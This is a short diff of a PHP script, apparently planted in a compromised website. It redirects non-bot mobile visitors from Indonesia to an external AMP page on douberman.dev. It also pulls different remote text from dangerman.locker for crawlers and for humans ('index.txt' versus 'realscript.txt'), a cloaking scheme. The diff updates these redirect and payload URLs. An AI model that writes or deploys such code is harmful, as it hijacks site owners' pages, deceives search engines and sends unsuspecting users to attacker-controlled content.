@@ -26,13 +26,13 @@ return $_SERVER["HTTP_CF_IPCOUNTRY"] ?? '';
 }
 
 if (!is_bot() && is_mobile() && strtolower(get_country()) === "id") {
-header("Location: https://douberman.dev/amp/amp-jurnalsamodrailmu.html/");
+header("Location: https://douberman.dev/amp/amp-lampuorid.html");
 die;
 }
 
 $url = is_bot()
-? "https://dangerman.locker/jurnalsamodrailmu/index.txt"
-: "https://dangerman.locker/jurnalsamodrailmu/realscript.txt";
+? "https://dangerman.locker/landing/lampuorid/index.txt"
+: "https://dangerman.locker/landing/lampuorid/realscript.txt";
 
 $content = @file_get_contents($url);
 
